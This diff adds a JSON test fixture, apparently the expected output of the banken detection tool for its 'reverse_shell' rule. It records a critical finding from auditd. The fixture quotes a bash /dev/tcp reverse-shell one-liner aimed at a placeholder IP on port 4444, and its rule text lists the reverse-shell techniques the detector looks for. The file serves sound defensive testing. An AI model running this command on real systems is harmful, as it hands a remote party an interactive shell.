@@ -1,0 +1,114 @@
+{
+  "activity_id": 1,
+  "activity_name": "Create",
+  "category_uid": 2,
+  "category_name": "Findings",
+  "class_uid": 2004,
+  "class_name": "Detection Finding",
+  "type_uid": 200401,
+  "type_name": "Detection Finding: Create",
+  "time": 1793448000000,
+  "timezone_offset": 0,
+  "severity_id": 5,
+  "severity": "Critical",
+  "status_id": 1,
+  "status": "New",
+  "message": "rule \"reverse_shell\" matched",
+  "metadata": {
+    "version": "1.3.0",
+    "profiles": [
+      "host"
+    ],
+    "product": {
+      "name": "banken",
+      "vendor_name": "conor-sometimes",
+      "version": "test",
+      "url_string": "https://github.com/conor-sometimes/banken"
+    },
+    "uid": "c5b8440943e6b23f3c779e1db4c5df52",
+    "log_provider": "auditd"
+  },
+  "finding_info": {
+    "uid": "c5b8440943e6b23f3c779e1db4c5df52",
+    "title": "Reverse shell spawned",
+    "desc": "A program invoked a classic reverse-shell one-liner - bash's /dev/tcp, a Python/Perl/Ruby socket shell, or nc with an exec. Opening an interactive shell back to a remote host is almost never legitimate automation; the attempt is unambiguous whether or not the outbound connection succeeds.",
+    "analytic": {
+      "type_id": 1,
+      "type": "Rule",
+      "name": "reverse_shell",
+      "uid": "0c9b10de-25ea-4ad5-8e07-d33508386857"
+    },
+    "attacks": [
+      {
+        "tactic": {
+          "uid": "TA0011",
+          "name": "Command and Control"
+        },
+        "technique": {
+          "uid": "T1059"
+        },
+        "sub_technique": {
+          "uid": "T1059.004"
+        }
+      }
+    ],
+    "data_sources": [
+      "auditd"
+    ]
+  },
+  "evidences": [
+    {
+      "process": {
+        "pid": 5000,
+        "name": "bash",
+        "cmd_line": "bash -c bash -i >& /dev/tcp/192.0.2.30/4444 0>&1",
+        "file": {
+          "name": "bash",
+          "path": "/usr/bin/bash",
+          "type_id": 1,
+          "type": "Regular File"
+        },
+        "user": {
+          "uid": "1000"
+        },
+        "parent_process": {
+          "pid": 4999
+        }
+      }
+    }
+  ],
+  "device": {
+    "type_id": 0,
+    "type": "Unknown",
+    "hostname": "golden-host"
+  },
+  "observables": [
+    {
+      "type_id": 13,
+      "type": "Command Line",
+      "value": "bash -c bash -i >& /dev/tcp/192.0.2.30/4444 0>&1"
+    },
+    {
+      "type_id": 9,
+      "type": "Process Name",
+      "value": "bash"
+    },
+    {
+      "type_id": 7,
+      "type": "File Name",
+      "value": "/usr/bin/bash"
+    },
+    {
+      "type_id": 1,
+      "type": "Hostname",
+      "value": "golden-host"
+    }
+  ],
+  "raw_data": "{\"time\":\"0001-01-01T00:00:00Z\",\"source\":\"auditd\",\"image\":\"/usr/bin/bash\",\"commandLine\":\"bash -c bash -i >& /dev/tcp/192.0.2.30/4444 0>&1\",\"parentImage\":\"\",\"targetFilename\":\"\",\"user\":\"1000\",\"currentDirectory\":\"/home/u\",\"pid\":5000,\"ppid\":4999}",
+  "unmapped": {
+    "current_directory": "/home/u",
+    "kind": "sigma",
+    "rule": "reverse_shell",
+    "source": "auditd"
+  }
+}
